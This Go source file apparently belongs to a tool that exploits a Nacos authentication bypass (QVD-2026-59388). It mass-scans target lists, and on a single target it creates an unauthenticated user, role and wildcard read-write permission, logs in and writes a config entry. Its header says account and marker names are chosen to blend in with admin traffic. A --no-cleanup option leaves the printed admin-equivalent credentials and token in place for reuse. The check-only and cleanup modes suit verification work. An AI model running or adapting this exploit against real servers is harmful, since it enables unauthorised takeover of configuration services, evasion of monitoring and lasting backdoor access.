// Package nacos implements the QVD-2026-59388 verification logic: posture
// probing, zero-write detection, the single-target exploit chain with
// cleanup, and concurrent batch scanning. Ephemeral identities and marker
// artifacts use ordinary operations-style naming so runs blend in with
// regular admin traffic.
package nacos

import (
	cryptorand "crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
	"unicode/utf8"

	"nacos3-scopehole/internal/httpx"
	"nacos3-scopehole/internal/jsonx"

	"golang.org/x/sync/errgroup"
)

const (
	// Nacos refreshes its cached auth info (users/roles/permissions) every 15
	// seconds when nacos.core.auth.caching.enabled=true, so a freshly created
	// account and its permissions may not be accepted by login/authorization
	// checks immediately.
	authCacheRetryWindowSeconds = 45
	authCacheRetryInterval      = 5 * time.Second
	batchStatusWidth            = 13
	batchDetailLimit            = 90
	markerSelectionAttempts     = 3
)

var (
	identityNames = []string{
		"zhangwei", "wangfang", "lilei", "chenjing", "liuyang",
		"opsmonitor", "deploysync", "configsync", "backupops", "appsupport",
	}
	identityRoles = []string{
		"opsadmin", "configmgr", "platformops", "devops", "secops", "appsupport",
	}
	markerDataIds = []string{
		"gateway-route-policy", "application-common", "log-collector",
		"datasource-read", "feature-toggle", "cache-refresh",
	}
	markerFeatureKeys = []string{
		"order-export", "refund-async", "gray-release", "push-channel", "audit-sampling",
	}
	markerTimeouts           = []int{2000, 3000, 5000, 8000}
	entropyReader  io.Reader = cryptorand.Reader
)

func randInt(n int) (int, error) {
	if n <= 0 {
		return 0, fmt.Errorf("random range must be positive")
	}
	value, err := cryptorand.Int(entropyReader, big.NewInt(int64(n)))
	if err != nil {
		return 0, err
	}
	return int(value.Int64()), nil
}

func pickRandom(list []string) (string, error) {
	index, err := randInt(len(list))
	if err != nil {
		return "", err
	}
	return list[index], nil
}

func randomHex(byteCount int) (string, error) {
	buf := make([]byte, byteCount)
	if _, err := io.ReadFull(entropyReader, buf); err != nil {
		return "", err
	}
	return hex.EncodeToString(buf), nil
}

func randomPassword() (string, error) {
	const alphabet = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789"
	const symbols = "@#$%^_"
	buf := make([]byte, 16)
	for i := range buf {
		index, err := randInt(len(alphabet))
		if err != nil {
			return "", err
		}
		buf[i] = alphabet[index]
	}
	firstSymbol, err := randInt(len(symbols))
	if err != nil {
		return "", err
	}
	lastSymbol, err := randInt(len(symbols))
	if err != nil {
		return "", err
	}
	body := string(buf)
	return string(symbols[firstSymbol]) + body[:8] + "-" + body[8:] + string(symbols[lastSymbol]), nil
}

type runArtifacts struct {
	username         string
	role             string
	password         string
	markerCandidates [markerSelectionAttempts]string
	markerContent    string
}

func randomMarker() (string, error) {
	prefix, err := pickRandom(markerDataIds)
	if err != nil {
		return "", err
	}
	suffix, err := randomHex(16)
	if err != nil {
		return "", err
	}
	return prefix + "-" + suffix + ".yaml", nil
}

func newRunArtifacts() (runArtifacts, error) {
	suffix, err := randomHex(16)
	if err != nil {
		return runArtifacts{}, err
	}
	namePrefix, err := pickRandom(identityNames)
	if err != nil {
		return runArtifacts{}, err
	}
	rolePrefix, err := pickRandom(identityRoles)
	if err != nil {
		return runArtifacts{}, err
	}
	password, err := randomPassword()
	if err != nil {
		return runArtifacts{}, err
	}
	var markerCandidates [markerSelectionAttempts]string
	for i := range markerCandidates {
		markerCandidates[i], err = randomMarker()
		if err != nil {
			return runArtifacts{}, err
		}
	}
	timeoutIndex, err := randInt(len(markerTimeouts))
	if err != nil {
		return runArtifacts{}, err
	}
	retryOffset, err := randInt(5)
	if err != nil {
		return runArtifacts{}, err
	}
	featureKey, err := pickRandom(markerFeatureKeys)
	if err != nil {
		return runArtifacts{}, err
	}
	return runArtifacts{
		username:         namePrefix + suffix,
		role:             rolePrefix + suffix,
		password:         password,
		markerCandidates: markerCandidates,
		markerContent: fmt.Sprintf(
			"# shared runtime defaults\ncommon:\n  timeout-ms: %d\n  retry-times: %d\nfeature:\n  %s: true\n",
			markerTimeouts[timeoutIndex], 1+retryOffset, featureKey),
	}, nil
}

func resultObject(resp httpx.Response) (*jsonx.Object, bool) {
	if resp.Status < 200 || resp.Status >= 300 {
		return nil, false
	}
	parsed, err := jsonx.Parse(resp.Body)
	if err != nil {
		return nil, false
	}
	obj, ok := parsed.(*jsonx.Object)
	if !ok {
		return nil, false
	}
	code, present := obj.Get("code")
	if !present || code == nil {
		return nil, false
	}
	number, ok := code.(json.Number)
	if !ok {
		return nil, false
	}
	asFloat, err := number.Float64()
	if err != nil || (asFloat != 0 && asFloat != 200) {
		return nil, false
	}
	if data, present := obj.Get("data"); present {
		if value, isBool := data.(bool); isBool && !value {
			return nil, false
		}
	}
	return obj, true
}

// Successful reports whether a response is a strict successful Nacos Result
// envelope. Endpoint-specific callers must additionally validate data shape.
func Successful(resp httpx.Response) bool {
	_, ok := resultObject(resp)
	return ok
}

func successfulBooleanResult(resp httpx.Response) bool {
	obj, ok := resultObject(resp)
	if !ok {
		return false
	}
	data, present := obj.Get("data")
	value, isBool := data.(bool)
	return present && isBool && value
}

func resultPageItems(resp httpx.Response) ([]any, bool) {
	obj, ok := resultObject(resp)
	if !ok {
		return nil, false
	}
	data, present := obj.Get("data")
	if !present {
		return nil, false
	}
	dataObj, ok := data.(*jsonx.Object)
	if !ok {
		return nil, false
	}
	items, present := dataObj.Get("pageItems")
	if !present {
		return nil, false
	}
	itemList, ok := items.([]any)
	return itemList, ok
}

func configContent(resp httpx.Response) (string, bool) {
	obj, ok := resultObject(resp)
	if !ok {
		return "", false
	}
	data, present := obj.Get("data")
	if !present {
		return "", false
	}
	dataObj, ok := data.(*jsonx.Object)
	if !ok {
		return "", false
	}
	content, present := dataObj.Get("content")
	value, isString := content.(string)
	return value, present && isString
}

func isNacosAuthDenied(resp httpx.Response) bool {
	if resp.Status != 401 && resp.Status != 403 {
		return false
	}
	parsed, err := jsonx.Parse(resp.Body)
	if err != nil {
		return false
	}
	obj, ok := parsed.(*jsonx.Object)
	if !ok {
		return false
	}
	code, present := obj.Get("code")
	number, isNumber := code.(json.Number)
	if !present || !isNumber {
		return false
	}
	value, err := number.Int64()
	if err != nil || value != 10001 {
		return false
	}
	message, present := obj.Get("message")
	messageText, isString := message.(string)
	return present && isString && strings.EqualFold(strings.TrimSpace(messageText), "access denied")
}

func isNacosConfigNotFound(resp httpx.Response) bool {
	if resp.Status != http.StatusNotFound {
		return false
	}
	parsed, err := jsonx.Parse(resp.Body)
	if err != nil {
		return false
	}
	obj, ok := parsed.(*jsonx.Object)
	if !ok {
		return false
	}
	code, present := obj.Get("code")
	number, isNumber := code.(json.Number)
	if !present || !isNumber {
		return false
	}
	value, err := number.Int64()
	if err != nil || value != 20004 {
		return false
	}
	message, present := obj.Get("message")
	messageText, isString := message.(string)
	return present && isString && strings.EqualFold(strings.TrimSpace(messageText), "resource not found")
}

// ExtractLogin pulls the access token and globalAdmin flag from a login
// response, falling back to a Bearer Authorization header.
func ExtractLogin(resp httpx.Response) (string, any) {
	parsed, err := jsonx.Parse(resp.Body)
	if err == nil {
		if obj, ok := parsed.(*jsonx.Object); ok {
			if data, present := obj.Get("data"); present {
				if inner, ok := data.(*jsonx.Object); ok {
					parsed = inner
				}
			}
		}
	}
	token := ""
	globalAdmin := any(nil)
	if obj, ok := parsed.(*jsonx.Object); ok {
		if value, present := obj.Get("accessToken"); present {
			token, _ = value.(string)
		}
		if value, present := obj.Get("globalAdmin"); present {
			globalAdmin = value
		}
	}
	if token == "" {
		authorization := resp.Header.Get("Authorization")
		if len(authorization) >= 7 && strings.EqualFold(authorization[:7], "bearer ") {
			token = authorization[7:]
		}
	}
	return token, globalAdmin
}

func extractUsernames(resp httpx.Response) (any, bool) {
	itemList, ok := resultPageItems(resp)
	if !ok {
		return nil, false
	}
	names := make([]any, 0, len(itemList))
	for _, item := range itemList {
		itemObj, ok := item.(*jsonx.Object)
		if !ok {
			return nil, false
		}
		username, present := itemObj.Get("username")
		if !present {
			return nil, false
		}
		if _, isString := username.(string); !isString {
			return nil, false
		}
		names = append(names, username)
	}
	return names, true
}

func reportPosture(w io.Writer, posture httpx.Response) {
	httpx.Summarize(w, "liveness and posture probe (admin scope)", posture)
	switch {
	case isNacosAuthDenied(posture):
		fmt.Fprintln(w, "Control group: admin scope rejects unauthenticated requests (expected).")
	case func() bool {
		_, ok := resultPageItems(posture)
		return ok
	}():
		fmt.Fprintln(w, "WARNING: unauthenticated admin-scope request succeeded, so nacos.core.auth.admin.enabled appears to be disabled; a successful chain would not demonstrate this vulnerability.")
	case posture.Status == 404:
		fmt.Fprintln(w, "Note: probe returned 404; the base URL or context path may be wrong.")
	default:
		fmt.Fprintf(w, "Note: probe returned HTTP %d; expected 403.\n", posture.Status)
	}
}

// ScanTarget runs the zero-write detection against one target and returns a
// status among vulnerable, open-auth, protected, unreachable, inconclusive.
func ScanTarget(hc *httpx.Client, baseURL string, verbose bool, out, errOut io.Writer) (string, string) {
	posture, err := hc.Do("GET", baseURL+"/v3/admin/cs/config/list",
		url.Values{"pageNo": {"1"}, "pageSize": {"1"}}, nil, nil)
	if err != nil {
		if errors.Is(err, httpx.ErrResponseTooLarge) {
			return "inconclusive", err.Error()
		}
		if verbose {
			fmt.Fprintf(errOut, "NETWORK ERROR: %v\n", err)
		}
		return "unreachable", err.Error()
	}
	if verbose {
		reportPosture(out, posture)
	}

	userList, err := hc.Do("GET", baseURL+"/v3/auth/user/list",
		url.Values{"pageNo": {"1"}, "pageSize": {"10"}}, nil, nil)
	if err != nil {
		if errors.Is(err, httpx.ErrResponseTooLarge) {
			return "inconclusive", err.Error()
		}
		if verbose {
			fmt.Fprintf(errOut, "NETWORK ERROR: %v\n", err)
		}
		return "unreachable", err.Error()
	}
	if verbose {
		httpx.Summarize(out, "unauthenticated user list (zero-write detection)", userList)
	}

	usernames, validUserList := extractUsernames(userList)
	_, validAdminList := resultPageItems(posture)
	if validUserList {
		detail := "leaked usernames: " + jsonx.Repr(usernames)
		if validAdminList {
			return "open-auth", "admin scope openly accessible; " + detail
		}
		if isNacosAuthDenied(posture) {
			return "vulnerable", detail
		}
		return "inconclusive",
			fmt.Sprintf("user list was exposed, but admin control returned unrecognized HTTP %d", posture.Status)
	}
	if isNacosAuthDenied(userList) {
		return "protected", "user list is protected; version and patch level were not inferred"
	}
	return "inconclusive", fmt.Sprintf("user list returned HTTP %d", userList.Status)
}

// TargetEntry is one batch target; Normalized is empty when the URL failed
// validation.
type TargetEntry struct {
	Display    string
	Normalized string
}

// LoadTargets reads a targets file: one per line, '#' comments and blank
// lines skipped, bare host[:port] getting http:// and the /nacos context.
func LoadTargets(path string) ([]TargetEntry, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var entries []TargetEntry
	for _, raw := range strings.Split(string(data), "\n") {
		line := strings.TrimSpace(raw)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		candidate := line
		if !strings.Contains(candidate, "://") {
			candidate = "http://" + candidate
		}
		if parsed, err := url.Parse(candidate); err == nil && (parsed.Path == "" || parsed.Path == "/") {
			candidate += "/nacos"
		}
		normalized, err := httpx.NormalizeBaseURL(candidate)
		if err != nil {
			entries = append(entries, TargetEntry{Display: line})
		} else {
			entries = append(entries, TargetEntry{Display: line, Normalized: normalized})
		}
	}
	return entries, nil
}

// RunBatch scans entries concurrently and prints the per-target result lines
// and summary; it returns 0 when any vulnerable/open-auth finding exists.
func RunBatch(hc *httpx.Client, entries []TargetEntry, workers int, out io.Writer) int {
	fmt.Fprintf(out, "Batch verification of %d target(s); zero-write detection only.\n\n", len(entries))
	type result struct {
		display, status, detail string
	}
	var results []result

	validIndices := make([]int, 0, len(entries))
	for i, entry := range entries {
		if entry.Normalized != "" {
			validIndices = append(validIndices, i)
		}
	}
	statuses := make([][2]string, len(validIndices))
	if len(validIndices) > 0 {
		var group errgroup.Group
		group.SetLimit(workers)
		for i := range validIndices {
			group.Go(func() error {
				status, detail := ScanTarget(hc, entries[validIndices[i]].Normalized, false, io.Discard, io.Discard)
				statuses[i] = [2]string{status, detail}
				return nil
			})
		}
		_ = group.Wait()
	}
	for i, index := range validIndices {
		results = append(results, result{
			display: entries[index].Normalized,
			status:  statuses[i][0],
			detail:  statuses[i][1],
		})
	}
	for _, entry := range entries {
		if entry.Normalized == "" {
			results = append(results, result{
				display: entry.Display,
				status:  "invalid",
				detail:  "invalid URL (scheme or host rejected)",
			})
		}
	}

	counts := make(map[string]int)
	for _, r := range results {
		counts[r.status]++
		detail := jsonx.EscapeControls(r.detail)
		if utf8.RuneCountInString(detail) > batchDetailLimit {
			detail = string([]rune(detail)[:batchDetailLimit]) + "..."
		}
		fmt.Fprintf(out, "[%-*s] %s  %s\n", batchStatusWidth, strings.ToUpper(r.status),
			jsonx.EscapeControls(r.display), detail)
	}
	fmt.Fprintln(out)
	order := []string{"vulnerable", "open-auth", "protected", "unreachable", "inconclusive", "invalid"}
	parts := make([]string, len(order))
	for i, status := range order {
		parts[i] = fmt.Sprintf("%d %s", counts[status], status)
	}
	fmt.Fprintln(out, "Summary: "+strings.Join(parts, ", "))
	if counts["vulnerable"]+counts["open-auth"] > 0 {
		return 0
	}
	return 1
}

func cleanupRequest(hc *httpx.Client, out, errOut io.Writer, label, method, rawURL string, params url.Values,
	headers map[string]string) bool {
	resp, err := hc.Do(method, rawURL, params, nil, headers)
	if err != nil {
		fmt.Fprintf(errOut, "[%s] cleanup warning: %v\n", label, err)
		return false
	}
	httpx.Summarize(out, label, resp)
	if !Successful(resp) {
		fmt.Fprintf(errOut, "[%s] cleanup warning: target returned HTTP %d or an unsuccessful Nacos result\n",
			label, resp.Status)
		return false
	}
	return true
}

func cleanupMarker(hc *httpx.Client, out, errOut io.Writer, base, token, marker, markerGroup,
	expectedContent string) bool {
	readBack, err := hc.Do("GET", base+"/v3/admin/cs/config",
		url.Values{"dataId": {marker}, "groupName": {markerGroup}, "namespaceId": {"public"}}, nil,
		map[string]string{"accessToken": token})
	if err != nil {
		fmt.Fprintf(errOut, "[cleanup marker config] cleanup warning: ownership check failed: %v\n", err)
		return false
	}
	content, ok := configContent(readBack)
	if !ok || content != expectedContent {
		httpx.Summarize(out, "cleanup marker ownership check", readBack)
		fmt.Fprintln(errOut,
			"[cleanup marker config] cleanup warning: marker content changed or could not be verified; refusing to delete it")
		return false
	}
	return cleanupRequest(hc, out, errOut, "cleanup marker config", "DELETE", base+"/v3/admin/cs/config",
		url.Values{
			"dataId":      {marker},
			"groupName":   {markerGroup},
			"namespaceId": {"public"},
			"tag":         {""},
			"srcUser":     {""},
			"clientIp":    {"127.0.0.1"},
		},
		map[string]string{"accessToken": token})
}

// RunSingle runs the full verification against one target. It returns the
// process exit code: 0 reproduced, 1 rejected/protected, 2 partial chain,
// 3 network error. Injected artifacts are cleaned up unless noCleanup is set.
func RunSingle(hc *httpx.Client, base, console string, checkOnly, noCleanup bool, out, errOut io.Writer) (exitCode int) {
	if checkOnly {
		status, detail := ScanTarget(hc, base, true, out, errOut)
		switch status {
		case "vulnerable", "open-auth":
			fmt.Fprintf(out, "REPRODUCED (detection only): %s\n", detail)
			fmt.Fprintln(out, "Nothing was created, modified, or deleted on the target.")
			return 0
		case "protected":
			fmt.Fprintf(out, "NOT REPRODUCED: %s\n", detail)
			return 1
		case "unreachable":
			return 3
		}
		fmt.Fprintf(out, "INCONCLUSIVE: %s\n", detail)
		return 1
	}

	artifacts, err := newRunArtifacts()
	if err != nil {
		fmt.Fprintf(errOut, "RANDOMNESS ERROR: refusing to mutate target: %v\n", err)
		return 2
	}
	username := artifacts.username
	role := artifacts.role
	password := artifacts.password
	resource := "*:*"
	action := "rw"

	userCreated := false
	roleCreated := false
	permissionCreated := false
	markerCreated := false
	token := ""
	marker := artifacts.markerCandidates[0]
	markerGroup := "DEFAULT_GROUP"
	markerContent := artifacts.markerContent

	userURL := base + "/v3/auth/user"
	roleURL := base + "/v3/auth/role"
	permissionURL := base + "/v3/auth/permission"

	fmt.Fprintf(out, "Target: %s\n", jsonx.EscapeControls(base))
	fmt.Fprintf(out, "Console: %s\n", jsonx.EscapeControls(console))
	fmt.Fprintf(out, "Ephemeral test identity: %s\n", username)

	defer func() {
		if !(userCreated || roleCreated || permissionCreated || markerCreated) {
			return
		}
		if noCleanup {
			fmt.Fprintf(out, "--no-cleanup given; keeping injected artifacts (user=%s, role=%s, marker=%s/%s)\n", username, role, markerGroup, marker)
			return
		}
		fmt.Fprintln(out, "Cleaning up ephemeral test artifacts...")
		cleanupOK := true
		if markerCreated && token != "" {
			cleanupOK = cleanupMarker(hc, out, errOut, base, token, marker, markerGroup, markerContent) && cleanupOK
		}
		if permissionCreated {
			cleanupOK = cleanupRequest(hc, out, errOut, "cleanup permission", "DELETE", permissionURL,
				url.Values{"role": {role}, "resource": {resource}, "action": {action}}, nil) && cleanupOK
		}
		if roleCreated {
			cleanupOK = cleanupRequest(hc, out, errOut, "cleanup role", "DELETE", roleURL,
				url.Values{"role": {role}, "username": {username}}, nil) && cleanupOK
		}
		if userCreated {
			cleanupOK = cleanupRequest(hc, out, errOut, "cleanup user", "DELETE", userURL,
				url.Values{"username": {username}}, nil) && cleanupOK
		}
		if !cleanupOK && exitCode == 0 {
			exitCode = 2
		}
	}()

	networkFailure := func(err error) int {
		fmt.Fprintf(errOut, "NETWORK ERROR: %v\n", err)
		return 3
	}

	posture, err := hc.Do("GET", base+"/v3/admin/cs/config/list",
		url.Values{"pageNo": {"1"}, "pageSize": {"1"}}, nil, nil)
	if err != nil {
		return networkFailure(err)
	}
	reportPosture(out, posture)
	if !isNacosAuthDenied(posture) {
		fmt.Fprintln(out,
			"INCONCLUSIVE: admin control was not a recognized Nacos authentication denial; refusing mutation.")
		return 1
	}

	createUser, err := hc.Do("POST", userURL, nil,
		url.Values{"username": {username}, "password": {password}}, nil)
	if err != nil {
		return networkFailure(err)
	}
	httpx.Summarize(out, "unauthenticated user creation", createUser)
	if !Successful(createUser) {
		fmt.Fprintln(out, "NOT REPRODUCED: request was rejected or the endpoint/path is unavailable.")
		return 1
	}
	userCreated = true

	createRole, err := hc.Do("POST", roleURL, nil,
		url.Values{"role": {role}, "username": {username}}, nil)
	if err != nil {
		return networkFailure(err)
	}
	httpx.Summarize(out, "unauthenticated role binding", createRole)
	if !Successful(createRole) {
		fmt.Fprintln(out, "PARTIAL: user creation bypass reproduced, role binding was rejected.")
		return 2
	}
	roleCreated = true

	createPermission, err := hc.Do("POST", permissionURL, nil,
		url.Values{"role": {role}, "resource": {resource}, "action": {action}}, nil)
	if err != nil {
		return networkFailure(err)
	}
	httpx.Summarize(out, "unauthenticated permission grant", createPermission)
	if !Successful(createPermission) {
		fmt.Fprintln(out, "PARTIAL: user/role bypass reproduced, permission grant was rejected.")
		return 2
	}
	permissionCreated = true

	var login httpx.Response
	var globalAdmin any
	loginDeadline := time.Now().Add(authCacheRetryWindowSeconds * time.Second)
	for {
		login, err = hc.Do("POST", console+"/v3/auth/user/login", nil,
			url.Values{"username": {username}, "password": {password}}, nil)
		if err != nil {
			return networkFailure(err)
		}
		httpx.Summarize(out, "login", login)
		token, globalAdmin = ExtractLogin(login)
		if token != "" || !time.Now().Before(loginDeadline) {
			break
		}
		fmt.Fprintln(out, "login not accepted yet; retrying while Nacos refreshes its auth cache...")
		time.Sleep(authCacheRetryInterval)
	}
	if token == "" {
		fmt.Fprintln(out, "PARTIAL: account was created but no login token was returned.")
		return 2
	}

	var configRead httpx.Response
	privilegeDeadline := time.Now().Add(authCacheRetryWindowSeconds * time.Second)
	for {
		configRead, err = hc.Do("GET", base+"/v3/admin/cs/config/list",
			url.Values{"pageNo": {"1"}, "pageSize": {"1"}}, nil,
			map[string]string{"accessToken": token})
		if err != nil {
			return networkFailure(err)
		}
		if _, ok := resultPageItems(configRead); ok || !time.Now().Before(privilegeDeadline) {
			break
		}
		fmt.Fprintln(out, "privilege not effective yet; retrying while Nacos refreshes its auth cache...")
		time.Sleep(authCacheRetryInterval)
	}
	httpx.Summarize(out, "read-only admin-scope authorization check", configRead)

	if _, ok := resultPageItems(configRead); !ok {
		fmt.Fprintln(out, "PARTIAL: management bypass reproduced, but the privilege check failed.")
		fmt.Fprintf(out, "Nacos login globalAdmin flag: %s\n", jsonx.Repr(globalAdmin))
		return 2
	}

	fmt.Fprintln(out, "REPRODUCED: unauthenticated account/role/permission creation succeeded.")
	fmt.Fprintf(out, "Nacos login globalAdmin flag: %s\n", jsonx.Repr(globalAdmin))

	markerAvailable := false
	for _, candidate := range artifacts.markerCandidates {
		marker = candidate
		markerProbe, err := hc.Do("GET", base+"/v3/admin/cs/config",
			url.Values{"dataId": {marker}, "groupName": {markerGroup}, "namespaceId": {"public"}}, nil,
			map[string]string{"accessToken": token})
		if err != nil {
			return networkFailure(err)
		}
		if isNacosConfigNotFound(markerProbe) {
			markerAvailable = true
			break
		}
		if _, exists := configContent(markerProbe); exists {
			continue
		}
		httpx.Summarize(out, "marker preflight", markerProbe)
		fmt.Fprintln(out, "PARTIAL: marker absence could not be established; refusing configuration write.")
		return 2
	}
	if !markerAvailable {
		fmt.Fprintln(out, "PARTIAL: could not select an unused marker configuration; refusing overwrite.")
		return 2
	}

	configWrite, err := hc.Do("POST", base+"/v3/admin/cs/config", nil,
		url.Values{
			"dataId":      {marker},
			"groupName":   {markerGroup},
			"namespaceId": {"public"},
			"content":     {markerContent},
			"type":        {"yaml"},
		},
		map[string]string{"accessToken": token})
	if err != nil {
		return networkFailure(err)
	}
	httpx.Summarize(out, "marker configuration write", configWrite)
	if !successfulBooleanResult(configWrite) {
		fmt.Fprintln(out, "PARTIAL: read access confirmed, but the marker write was rejected.")
		return 2
	}
	markerCreated = true
	readBack, err := hc.Do("GET", base+"/v3/admin/cs/config",
		url.Values{"dataId": {marker}, "groupName": {markerGroup}, "namespaceId": {"public"}}, nil,
		map[string]string{"accessToken": token})
	if err != nil {
		return networkFailure(err)
	}
	httpx.Summarize(out, "marker configuration read-back", readBack)
	content, confirmed := configContent(readBack)
	if !confirmed || content != markerContent {
		fmt.Fprintln(out, "PARTIAL: marker write response succeeded, but exact content read-back did not match.")
		return 2
	}
	fmt.Fprintln(out, "Write confirmed: exact marker content persisted.")

	divider := strings.Repeat("=", 68)
	fmt.Fprintln(out, divider)
	fmt.Fprintln(out, "Injected account (admin-equivalent access):")
	fmt.Fprintf(out, "  username : %s\n", username)
	fmt.Fprintf(out, "  password : %s\n", password)
	fmt.Fprintf(out, "  token    : %s\n", jsonx.Repr(token))
	fmt.Fprintln(out, divider)
	if noCleanup {
		fmt.Fprintln(out, "--no-cleanup given: the injected account and token remain usable on the target.")
	} else {
		fmt.Fprintln(out, "Note: cleanup will remove the injected account; the token then becomes invalid.")
		fmt.Fprintln(out, "Pass --no-cleanup to keep the account and token for reuse.")
	}
	return 0
}
